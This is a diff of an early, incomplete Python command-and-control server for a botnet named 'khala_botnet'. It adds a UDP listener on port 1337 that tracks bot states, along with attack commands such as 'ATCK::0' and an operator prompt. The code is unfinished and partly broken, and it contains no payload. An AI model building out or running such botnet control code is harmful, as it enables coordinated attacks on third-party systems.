@@ -4,23 +4,54 @@ import threading
 import time
 
 PORT = 1337
-
 COMMANDS = ['HELO_S', 'ROLL', 'ATCK::0', 'ATCK::1::', 'STOP']
 
+bots = {}   # k = bot address, v = bot state
+
+'''
 logging.basicConfig(level=logging.INFO,
         format='%(asctime)s PID:%(process)d %(message)s',
         datefmt='%H:%M:%S',
         filename='./cnc.log')
         #filename='/tmp/cnc.log')
 logger = logging.getLogger('')
+'''
 
-def listener():
-    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    listen_sock.bind(('', PORT))
+def bot_listener():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('', PORT))
 
     while True:
-        data, addr = listen_sock.recv(1024).decode('utf-8')
-        print(data)
+        bot_resp, client_addr = sock.recvfrom(1024)
+
+        if bot_resp == 'HELO':
+            bots[client_addr] = 0
+            logger.info("Received 'HELO' from: {}".format(client_addr))
+        elif bot_resp == 'REDY':
+            bots[client_addr] = 1
+            logger.info("Received 'REDY' from: {}".format(client_addr))
+        elif bot_resp == 'BUSY':
+            bots[client_addr] = 2
+            logger.info("Received 'BUSY' from {}".format(client_addr))
+
+def server_cmd():
+    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    while True:
+        try:
+            user_input = raw_input("khala_botnet$")
+        except KeyboardInterrupt:
+            sock.close()
+
+        tokens = user_input.split(' ')
+        print(user_input)
+
+    
+
+def main():
+
+    #threading.Thread(target=bot_listener).start()
+
 
 class Server:
     def __init__(self):
